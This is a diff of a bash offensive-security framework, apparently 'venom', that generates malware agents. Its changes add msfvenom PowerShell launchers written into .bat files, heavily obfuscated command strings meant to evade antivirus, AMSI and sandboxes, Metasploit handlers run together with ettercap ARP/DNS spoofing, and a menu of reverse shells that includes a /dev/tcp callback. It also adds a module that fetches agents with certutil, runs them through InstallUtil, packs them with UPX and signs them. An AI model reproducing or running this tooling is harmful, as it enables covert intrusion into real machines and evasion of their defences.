+KEYID=$(cat /dev/urandom | tr -dc '13' | fold -w 3 | head -n 1)
+if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
+xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd -n 20 > $IPATH/output/chars.raw"
 else
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw"
+xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd -n $KEYID > $IPATH/output/chars.raw"
 fi
 disp=`cat $IPATH/output/chars.raw | awk {'print $12'}`
 
@@ -10099,15 +10487,20 @@ sleep 2
 cd $IPATH/output/
 echo "[☠] Parsing agent shellcode data .."
 sleep 1
-echo "[☠] Injecting shellcode into $N4m.bat!"
+echo "[☠] Injecting shellcode into: $N4m.bat"
 sleep 2
-echo ":: powershell bat template | Author: r00t-3xp10it" > $N4m.bat
-# echo ":: Using \` psh escape caracter to ofuscate syscall " >> $N4m.bat
-echo ":: ---" >> $N4m.bat
-echo "@echo off" >> $N4m.bat
-# echo "powershell.exe -nop -wind \`h\`id\`den -Exec \`By\`pa\`ss -noni -enc $disp" >> $N4m.bat
-echo "cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $disp" >> $N4m.bat
-echo "exit" >> $N4m.bat
+OBF=$(zenity --list --title "☠ AGENT STRING OBFUSCATION ☠" --text "Obfuscate the agent [ template ] command arguments ?\nUsing special escape characters, whitespaces, concaternation, amsi\nsandbox evasion and variables piped and de-obfuscated at runtime\n'The agent will delay 3 sec is execution to evade sandbox detection'" --radiolist --column "Pick" --column "Option" TRUE "None-Obfuscation (default)" FALSE "String Obfuscation (3 sec)" --width 353 --height 245) > /dev/null 2>&1
+if [ "$OBF" = "None-Obfuscation (default)" ]; then
+echo "@echo off&&cmd.exe /c powershell.exe -nop -exec bypass -wind hidden -noni -enc $disp" > $N4m.bat
+else
+echo "[✔] String obfuscation technic sellected .."
+# OBFUSCATE SYSCALLS (evade AV/AMSI + SandBox Detection)
+# https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md
+# HINT: setting -ExecutionPolicy/-ep is redundant since -EncodedCommand/-enc automatically bypasses the execution policy
+#
+# STRING: cmd.exe /c powershell.exe -NoPRo -wIN 1 -nONi -eN $disp
+echo "@e%!%ch^O ,;, Of^f&&(,(,, (,;Co%LD%p%La%y %windir%\\\Le%!HuB!%git^Che%i%ck^Co%U%nt%-3%rol\".\"d^ll %temp%\\key^s\\Le^git^C%OM%he^ck^Cont%-R%rol.t^m%A%p));,, )&,( (,, @pi%!h%n^g -^n 4 w%%!hw^w.mi^cro%d0b%sof^t.c^o%OI%m > %tmp%\\lic%dR%e^ns%at%e.p^em);, ,) &&,(, (,,%$'''%, (,;c^Md%i%\".\"e%i0%X^e ,,/^R =c^O%Unt-8%p^Y /^Y %windir%\\Sy^s%dE%te^m%-%32\\Win^do%'''%w^s%AT%Power%Off%s^he%$'''%ll\\\v1.0\\p^o%IN%we^rs^%-iS%hell.e%!'''$%x%-i%e ,;^, %tmp%\\W^UAU%-Key%CTL.m%$%s%$'''%c &&,,, @c^d ,, %tmp% && ,;WU%VoiP%AUC%$,,,,%TL.m%-8%s^c /^No%db%PR^o  /w%Eb%\"I\"^N 1 /^%$'''%n\"O\"N%Func%i  /^eN%GL% $disp),) %i% ,,)" > $N4m.bat
+fi
 chmod +x $IPATH/output/$N4m.bat
 N4m="$N4m.bat"
 
@@ -10165,7 +10558,7 @@ else
   sed -i "s/RdI/$D1r/g" trigger.hta
   mv trigger.hta $IPATH/output/EasyFileSharing.hta > /dev/null 2>&1
 fi
-echo "[☠] Remote upload agent path sellected: $D1r"
+echo "[☠] Remote upload agent path sellected:$D1r"
 sleep 2
 #
 # copy all files to apache2 webroot ..
@@ -10227,7 +10620,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m on target every 23 hours" --width 300) > /dev/null 2>&1
 
     cd $IPATH/aux
-    # Build persistence script (AutoRunStart='multi_console_command -rc')
+    # Build persistence script (AutoRunStart='multi_console_command -r')
     cp persistence.rc persistence[bak].rc
     sed -i "s|N4m|$N4m|g" persistence.rc
     sed -i "s|IPATH|$IPATH|g" persistence.rc
@@ -10324,9 +10717,9 @@ fi
           if [ "$MsFlF" = "ON" ]; then
 
             if [ "$chose" = "Build venom agent.bat" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             fi
 
             cd $IPATH/output
@@ -10345,9 +10738,9 @@ fi
           else
 
             if [ "$chose" = "Build venom agent.bat" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             fi
           fi
 
@@ -10365,9 +10758,9 @@ fi
           if [ "$MsFlF" = "ON" ]; then
 
             if [ "$chose" = "Build venom agent.bat" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             fi
 
             cd $IPATH/output
@@ -10386,9 +10779,9 @@ fi
           else
 
             if [ "$chose" = "Build venom agent.bat" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             fi
           fi
         fi
@@ -10432,30 +10825,34 @@ sh_buildin () {
 QuE=$(zenity --question --title "☠ BUILT-IN SHELL GENERATOR ☠" --text "This module uses system built-in tools sutch as:\n'bash, netcat, ssh, python, perl, js, powershell'\nAnd use them to spaw a tcp connection.\n\nrun module?" --width 320) > /dev/null 2>&1
      if [ "$?" -eq "0" ]; then
 
-       sh_stage2
+cat << !
 
-      else
-        echo "[x] Abort module execution .."
-        sleep 2
-        clear
-      fi
-}
+    OPTION    DESCRIPTION                   TARGET OS
+    ------    -----------                   ---------
+    1         simple ssh shell              Windows
+    2         simple bash shell             Linux|Bsd|OSx
+    3         simple reverse bash shell     Linux|Bsd|OSx
+    4         simple reverse netcat shell   Windows
+    5         simple reverse python shell   Linux|Bsd|Solaris|OSx|Windows
+    6         simple reverse python shell2  Linux|Bsd|Solaris|OSx|Windows
+    7         simple powershell shell       Windows
+    8         simple php reverse shell      Web-Servers
+    9         ruby Reverse_bash_shell       Linux
+    10        ruby Reverse_bash_shell2      Linux
+    11        perl-reverse-shell            Linux|Windows
+    12        node.js reverse shell         Windows
 
-
-
-sh_stage2 () {
-# get user input to build the payload
-echo "[☆] Enter shell settings!"
-lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
-lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
-
-
-# CHOSE WHAT PAYLOAD TO USE
-InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis module uses system built-in tools sutch\nas bash,netcat,ssh and use them to spaw a\ntcp connection (reverse or bind shell).\n\nAvailable shells:" --radiolist --column "Pick" --column "Option" TRUE "simple ssh shell" FALSE "simple bash shell" FALSE "simple reverse bash shell" FALSE "simple reverse netcat shell" FALSE "simple reverse python shell" FALSE "simple reverse python shell2" FALSE "simple powershell shell" FALSE "simple php reverse shell" FALSE "ruby Reverse_bash_shell" FALSE "ruby Reverse_bash_shell2" FALSE "perl-reverse-shell" FALSE "node.js reverse shell" --width 350 --height 580) > /dev/null 2>&1
-
+!
+sleep 1
+echo -n "${BlueF}[${GreenF}➽${BlueF}]${white} Chose Option number:"${Reset};
+read InSh3ll
 
    # built-in systems shells
-   if [ "$InSh3ll" = "simple bash shell" ]; then
+   if [ "$InSh3ll" = "1" ]; then
+     # get user input to build the payload
+     echo "[☆] Enter shell settings!"
+     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
      echo "[✔] Building -> simple bash shell..."
      echo "---"
      echo "- simple bash shell that uses bash dev/tcp"
@@ -10471,7 +10868,11 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      sleep 2
 
 
-   elif [ "$InSh3ll" = "simple reverse bash shell" ]; then
+   elif [ "$InSh3ll" = "2" ]; then
+     # get user input to build the payload
+     echo "[☆] Enter shell settings!"
+     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
      echo "[✔] Building -> simple reverse bash shell..."
      echo "---"
      echo "- simple reverse bash shell uses bash dev/tcp"
@@ -10488,7 +10889,11 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
  
 
 
-   elif [ "$InSh3ll" = "simple reverse netcat shell" ]; then
+   elif [ "$InSh3ll" = "3" ]; then
+     # get user input to build the payload
+     echo "[☆] Enter shell settings!"
+     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
      echo "[✔] Building -> simple reverse netcat shell..."
      echo "---"
      echo "- simple Netcat reverse shell using bash"
@@ -10503,7 +10908,11 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      sleep 2
 
 
-   elif [ "$InSh3ll" = "simple ssh shell" ]; then
+   elif [ "$InSh3ll" = "4" ]; then
+     # get user input to build the payload
+     echo "[☆] Enter shell settings!"
+     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
      echo "[✔] Building -> simple ssh shell..."
      echo "---"
      echo "- Reverse connect using an SSH tunnel"
@@ -10519,7 +10928,11 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      sleep 2
 
 
-   elif [ "$InSh3ll" = "simple reverse python shell" ]; then
+   elif [ "$InSh3ll" = "5" ]; then
+     # get user input to build the payload
+     echo "[☆] Enter shell settings!"
+     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
      cd $IPATH/templates/
      N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell" --entry --width 330) > /dev/null 2>&1
      sed "s|IpAdDr|$lhost|" simple_shell.py > simple.raw
@@ -10546,7 +10959,11 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      sleep 2
 
 
-   elif [ "$InSh3ll" = "simple reverse python shell2" ]; then
+   elif [ "$InSh3ll" = "6" ]; then
+     # get user input to build the payload
+     echo "[☆] Enter shell settings!"
+     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
      cd $IPATH/templates/
      N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell" --entry --width 330) > /dev/null 2>&1
      sed "s|IpAdDr|$lhost|" simple_shell2.py > simple.raw
@@ -10575,7 +10992,11 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      sleep 2
 
 
-   elif [ "$InSh3ll" = "simple powershell shell" ]; then
+   elif [ "$InSh3ll" = "7" ]; then
+     # get user input to build the payload
+     echo "[☆] Enter shell settings!"
+     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
      cd $IPATH/templates/
      N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell" --entry --width 330) > /dev/null 2>&1
      sed "s|IpAdDr|$lhost|" simple_powershell.ps1 > simple.raw
@@ -10603,7 +11024,11 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      sleep 2
 
 
-   elif [ "$InSh3ll" = "ruby Reverse_bash_shell" ]; then
+   elif [ "$InSh3ll" = "8" ]; then
+     # get user input to build the payload
+     echo "[☆] Enter shell settings!"
+     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
      echo "[✔] Building -> reverse bin/sh shell..."
      echo "---"
      echo "- simple ruby bash shell that uses rsocket"
@@ -10618,7 +11043,11 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      sleep 2
 
 
-   elif [ "$InSh3ll" = "ruby Reverse_bash_shell2" ]; then
+   elif [ "$InSh3ll" = "9" ]; then
+     # get user input to build the payload
+     echo "[☆] Enter shell settings!"
+     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
      echo "[✔] Building -> reverse bin/sh shell..."
      echo "---"
      echo "- simple ruby bash shell that uses rsocket"
@@ -10633,7 +11062,11 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      sleep 2
 
 
-   elif [ "$InSh3ll" = "simple php reverse shell" ]; then
+   elif [ "$InSh3ll" = "10" ]; then
+     # get user input to build the payload
+     echo "[☆] Enter shell settings!"
+     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
      echo "[✔] Building -> simple php reverse shell..."
      echo "---"
      echo "- simple php reverse shell that uses socket programming"
@@ -10648,7 +11081,11 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      sleep 2
 
 
-   elif [ "$InSh3ll" = "perl-reverse-shell" ]; then
+   elif [ "$InSh3ll" = "11" ]; then
+     # get user input to build the payload
+     echo "[☆] Enter shell settings!"
+     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
      cd $IPATH/templates/
      N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell" --entry --width 330) > /dev/null 2>&1
      sed "s|IpAdDr|$lhost|" perl-reverse-shell.pl > simple.raw
@@ -10674,7 +11111,11 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      sleep 2
 
 
-   elif [ "$InSh3ll" = "node.js reverse shell" ]; then
+   elif [ "$InSh3ll" = "12" ]; then
+     # get user input to build the payload
+     echo "[☆] Enter shell settings!"
+     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
      N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell" --entry --width 330) > /dev/null 2>&1
      echo "require('chield_process').exec('bash -i >& /dev/tcp/$lhost/$lport 0>1');" > $IPATH/output/$N4m.js
      chmod +x $IPATH/output/$N4m.js > /dev/null 2>&1
@@ -10696,13 +11137,17 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
    else
 
 
-     echo "[x] Abort module execution .."
+     echo "${RedF}[x]${white} Abort module execution .."${Reset};
      sleep 2
      clear
    fi
-cd $IPATH/
-}
 
+else
+  echo "${RedF}[x]${white} Abort module execution .."${Reset};
+  sleep 2
+  clear
+fi
+}
 
 
 
@@ -10737,7 +11182,7 @@ if [ "$Chts" = "ON" ]; then
 fi
 
 
-echo "[☠] Exit Console -> Stoping Services..."
+echo "${BlueF}[☠]${white} Exit Console -> Stoping Services..."${Reset};
 sleep 1
 if [ "$DiStR0" = "Kali" ]; then
 service postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
@@ -10751,7 +11196,7 @@ rm $IPATH/templates/hta_attack/index[bak].html > /dev/null 2>&1
 cd $IPATH
 cd ..
 sudo chown -hR $user venom-main > /dev/null 2>&1
-echo "[☠] Report-Bugs: https://github.com/r00t-3xp10it/venom/issues"
+echo "${BlueF}[☠]${white} Report-Bugs: https://github.com/r00t-3xp10it/venom/issues"${Reset};
 exit
 }
 
@@ -10759,12 +11204,580 @@ exit
 
 
 
-#
-# SUB-MENUS (payload categories)
-#
-sh_unix_menu () {
-echo "[☠] Loading Unix agents .."
+## -------------------
+# AMSI EVASION MODULES
+## -------------------
+sh_ninja () {
+echo ${BlueF}[${YellowF}i${BlueF}]${white} Loading Amsi ${YellowF}[Evasion]${white} agents ..${Reset};
+sleep 2
+cat << !
+
+
+    AGENT Nº1
+    ╔──────────────────────────────────────────────────────────────
+    | AGENT EXTENSION    : EXE
+    | LAUNCHER EXTENSION : BAT
+    | LOLBin             : certutil|InstallUtil
+    | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
+    | DESCRIPTION        : Simple TCP reverse shell in C (compiled to exe)
+
+    AGENT Nº2
+    ╔──────────────────────────────────────────────────────────────
+    | AGENT EXTENSION    : EXE|PY
+    | LAUNCHER EXTENSION : BAT|--
+    | LOLBin             : certutil
+    | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10) - Linux (agent.py)
+    | DESCRIPTION        : Simple TCP reverse shell in PYTHON (compiled to exe)
+
+    AGENT Nº3
+    ╔──────────────────────────────────────────────────────────────
+    | AGENT EXTENSION    : PS1
+    | LAUNCHER EXTENSION : BAT
+    | LOLBin             : certutil|WinHttpRequest
+    | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
+    | DESCRIPTION        : Simple TCP reverse shell in PS1 (powercat.ps1)
+
+    AGENT Nº4:
+    ╔──────────────────────────────────────────────────────────────
+    | AGENT EXTENSION    : PS1
+    | LAUNCHER EXTENSION : BAT
+    | LOLBin             : certutil|WinHttpRequest
+    | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
+    | DESCRIPTION        : Simple TCP reverse shell in PS1 (agent.ps1)
+
+
+    ╔─────────────────────────────────────────────────────────────╗
+    ║   M    - Return to main menu                                ║
+    ║   E    - Exit venom Framework                               ║
+    ╚─────────────────────────────────────────────────────────────╝
+
+
+!
+echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
 sleep 1
+echo -n ${BlueF}[${GreenF}➽${BlueF}]${white} Chose Agent number:${Reset};
+read choice
+case $choice in
+1) sh_evasion1 ;;
+2) sh_evasion2 ;;
+3) sh_evasion3 ;;
+4) sh_evasion4 ;;
+m|M) sh_menu ;;
+e|E) sh_exit ;;
+*) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2; clear; sh_ninja ;;
+esac
+}
+
+
+
+
+# ---------------------------------------------
+# Simple TCP reverse shell in C compiled to exe
+# ---------------------------------------------
+sh_evasion1 () {
+Colors;
+lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
+NaM=$(zenity --title="☠ Enter FILENAME ☠" --text "example: notepad" --entry --width 300) > /dev/null 2>&1
+
+# display final settings to user
+echo "${BlueF}[${YellowF}i${BlueF}]${white} MODULE SETTINGS"${Reset};
+echo ${BlueF}"---"
+cat << !
+    LPORT    : $lport
+    LHOST    : $lhost
+    LOLBin   : certutil|InstallUtil
+    LAUNCHER : $IPATH/output/$NaM.bat
+    AGENT    : $IPATH/output/$NaM.exe
+
+!
+echo "---"
+
+
+## BUILD LAUNCHER
+echo "${BlueF}[☠]${white} Building Obfuscated bat Launcher .."${Reset};
+sleep 2
+## TODO: check if it connects back
+# OBFUSCATE SYSCALLS (evade AV/AMSI)
+# https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md
+# ---
+# echo "@echo off" > $IPATH/output/Launcher.bat
+# echo "sEt !h=f" >> $IPATH/output/Launcher.bat
+# echo "echo Please Wait, Installing Software .." >> $IPATH/output/Launcher.bat
+# echo "@cErt^uT%OKEN%il.ex%it%e -u%TOKEN%rl%(0..3)%cache -sp%+%lit -%!h% http://$lhost/$NaM.exe $NaM.exe && pC%USER%a^lUa -a $NaM.exe" >> $IPATH/output/Launcher.bat
+# echo "exit" >> $IPATH/output/Launcher.bat
+# ---
+# Parse ip addr (split lhost)
+one=$(echo $lhost | cut -d '.' -f1,2)
+two=$(echo $lhost | cut -d '.' -f3,4)
+echo "@e%!%ch^O ,;, Of^f&&(,(,, (,;sEt i0=f&&sEt T0=$one&&sEt NULL=$two&&@e%!%ch^O please wait, installing software.&&@cErt^uT%OKEN%il.ex%HUB%e -u%TOKEN%rl%[0..3]%ca%F%che -sp%d0b%lit -%i0% http://%T0%.%NULL%/$NaM.exe $NaM.exe),) %i% ,,)&&(,(;C:\Windows\Microsoft.NET\Framework\\\\v4.0.30319\Install%_init_%Util.ex%HUSBAND%e /log^fi%na%le= /Log%FILE%To%_i_%Console=false /U $NaM.exe),)&&eXit" > $IPATH/output/$NaM.bat
+
+
+## COMPILE C Program
+# TODO: rename binary.exe to binary.jpg (IN CMD: start binary.jpg)
+echo "${BlueF}[☠]${white} Compiling C Program (tcp_reverse_shell) .."${Reset};
+sleep 2
+cd $IPATH/templates/evasion1
+chmod +x compile.sh > /dev/nul 2>&1
+sed "s|IpAdDr|$lhost|g" auto.c > shell1.c
+sed "s|LpOrT|$lport|g" shell1.c > shell.c
+xterm -T " COMPILING - tcp_reverse_shell" -geometry 110x23 -e "./compile.sh shell && sleep 1"
+
+
+## check for UPX installation
+upx_packer=`which upx`
+if ! [ "$?" -eq "0" ]; then
+  echo "${RedF}[x]${white} UPX Packer not found, installing .."${Reset};sleep 2
+  echo "" && sudo apt-get install upx-ucl && echo ""
+fi
+
+
+## AV evasion (pack binary)
+echo "${BlueF}[☠]${white} Packing final executable with UPX .."${Reset};sleep 2
+echo ""
+upx -9 -v -o $NaM.exe shell.exe
+mv $NaM.exe $IPATH/output/$NaM.exe > /dev/nul 2>&1
+echo ""
+
+
+## check for CarbonCopy dependencies
+# sign executale binary with ssl
+ossl_packer=`which osslsigncode`
+if ! [ "$?" -eq "0" ]; then
+  echo "${RedF}[x]${white} osslsigncode Package not found, installing .."${Reset};sleep 2
+  echo "" && sudo apt-get install osslsigncode && pip3 install pyopenssl && echo ""
+fi
+
+
